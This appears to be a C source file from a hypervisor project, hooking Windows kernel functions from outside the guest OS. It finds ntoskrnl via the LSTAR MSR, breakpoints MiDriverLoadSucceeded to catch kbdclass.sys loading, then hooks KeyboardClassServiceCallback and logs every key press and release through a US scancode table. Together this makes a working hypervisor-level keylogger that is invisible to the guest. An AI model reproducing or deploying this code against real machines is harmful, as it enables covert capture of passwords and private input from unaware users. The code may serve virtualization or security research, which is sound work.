#include <hooks/keyboard.h>
#include <vmm/vmm.h>
#include <vmm/vmcs.h>
#include <lib/instr.h>
#include <vmm/paging.h>
#include <lib/util.h>

__attribute__((section(".vmm"))) uint64_t guest_virtual_to_physical(uint64_t addr, uint64_t cr3){
    qword_t *pml4 = cr3, *pml3, *pml2, *pml1;
    qword_t pml4e, pml3e, pml2e, pml1e;

    pml4e = pml4[PML4E_IDX(addr)];
    if (!(pml4e & PAGING_P)) return 0;

    pml3 = pml4e & PAGING_ENTRY_MASK;
    pml3e = pml3[PML3E_IDX(addr)];
    if (!(pml3e & PAGING_P)) return 0;
    if (pml3e & PAGING_PS) return (pml3e & PAGING_ENTRY_MASK) + PAGING_OFFSET_1GB(addr);

    pml2 = pml3e & PAGING_ENTRY_MASK;
    pml2e = pml2[PML2E_IDX(addr)];
    if (!(pml2e & PAGING_P)) return 0;
    if (pml2e & PAGING_PS) return (pml2e & PAGING_ENTRY_MASK) + PAGING_OFFSET_2MB(addr);

    pml1 = pml2e & PAGING_ENTRY_MASK;
    pml1e = pml1[PML1E_IDX(addr)];
    if (!(pml1e & PAGING_P)) return 0;
    return (pml1e & PAGING_ENTRY_MASK) + PAGING_OFFSET_4KB(addr);

}

__attribute__((section(".vmm"))) void hook_function(byte_t *func){
    *func = INT3;
}

__attribute__((section(".vmm"))) void handle_lstar_write(uint64_t lstar){

    // LSTAR is either KiSystemCall64Shadow or KiSystemCall64. Try both.
    if (!((lstar-NTOSKRNL_KiSystemCall64Shadow_OFFSET) & 0xfff))
        shared_cores_data.ntoskrnl = lstar-NTOSKRNL_KiSystemCall64Shadow_OFFSET;
    else if (!((lstar-NTOSKRNL_KiSystemCall64_OFFSET) & 0xfff))
        shared_cores_data.ntoskrnl = lstar-NTOSKRNL_KiSystemCall64_OFFSET;
    else
        LOG_ERROR("FAILED TO FIND NTOSKRNL (LSTAR=%x)\n", lstar);

    uint64_t MiDriverLoadSucceeded = shared_cores_data.ntoskrnl + NTOSKRNL_MiDriverLoadSucceeded_OFFSET;
    uint64_t ntoskrnl_phys = guest_virtual_to_physical(shared_cores_data.ntoskrnl, __vmread(GUEST_CR3));
    uint64_t MiDriverLoadSucceeded_phys = guest_virtual_to_physical(MiDriverLoadSucceeded, __vmread(GUEST_CR3));
    
    clear_msr_bitmap_write(LSTAR_MSR, shared_cores_data.msr_bitmaps);

    hook_function(MiDriverLoadSucceeded_phys);
}

__attribute__((section(".vmm"))) void handle_MiDriverLoadSucceeded_hook(vmexit_data_t *state){

    // Emulate PUSH RBP
    __vmwrite(GUEST_RSP, __vmread(GUEST_RSP)-8);
    uint64_t guest_stack = __vmread(GUEST_RSP);
    uint64_t guest_stack_phys = guest_virtual_to_physical(guest_stack, __vmread(GUEST_CR3));
    *(uint64_t*)guest_stack_phys = state->registers->rbp;

    uint64_t driver = *(uint64_t*)(guest_virtual_to_physical(guest_stack+0x70, __vmread(GUEST_CR3)));
    uint64_t driver_signature_phys = guest_virtual_to_physical(driver+KBDCLASS_SIGNATURE_OFFSET, __vmread(GUEST_CR3));
    if (memcmp(driver_signature_phys, "kbdclass.pdb", 13)){
        LOG_INFO("Found kbdclass.sys: %x\n", driver);
        
        shared_cores_data.kbdclass = driver;
        hook_function(guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET, __vmread(GUEST_CR3)));

        // Remove the MiDriverLoadSucceeded hook
        uint64_t MiDriverLoadSucceeded_phys = guest_virtual_to_physical(__vmread(GUEST_RIP), __vmread(GUEST_CR3));
        *(uint8_t*)MiDriverLoadSucceeded_phys = PUSH_RBP;
    }
}

__attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(vmexit_data_t *state){

    // Emulate PUSH RBP
    __vmwrite(GUEST_RSP, __vmread(GUEST_RSP)-8);
    uint64_t guest_stack = __vmread(GUEST_RSP);
    uint64_t guest_stack_phys = guest_virtual_to_physical(guest_stack, __vmread(GUEST_CR3));
    *(uint64_t*)guest_stack_phys = state->registers->rbp;
    KEYBOARD_INPUT_DATA *InputDataStart = state->registers->rdx;
    KEYBOARD_INPUT_DATA *InputDataEnd = state->registers->r8;

    char kbd_US [128] =
    {
        0,  27, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',   
    '\t', /* <-- Tab */
    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',     
        0, /* <-- control key */
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`',  0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/',   0,
    '*',
        0,  /* Alt */
    ' ',  /* Space bar */
        0,  /* Caps lock */
        0,  /* 59 - F1 key ... > */
        0,   0,   0,   0,   0,   0,   0,   0,
        0,  /* < ... F10 */
        0,  /* 69 - Num lock*/
        0,  /* Scroll Lock */
        0,  /* Home key */
        0,  /* Up Arrow */
        0,  /* Page Up */
    '-',
        0,  /* Left Arrow */
        0,
        0,  /* Right Arrow */
    '+',
        0,  /* 79 - End key*/
        0,  /* Down Arrow */
        0,  /* Page Down */
        0,  /* Insert Key */
        0,  /* Delete Key */
        0,   0,   0,
        0,  /* F11 Key */
        0,  /* F12 Key */
        0,  /* All other keys are undefined */
    };

    KEYBOARD_INPUT_DATA *data_phys;
    for (; InputDataStart < InputDataEnd; InputDataStart++){
        data_phys = guest_virtual_to_physical(InputDataStart, __vmread(GUEST_CR3));
        if (data_phys->Flags == KEY_MAKE)
            LOG_INFO("Key pressed: %c\n", kbd_US[data_phys->MakeCode]);
        else if (data_phys->Flags == KEY_BREAK)
            LOG_INFO("Key released: %c\n", kbd_US[data_phys->MakeCode]);
    }

}

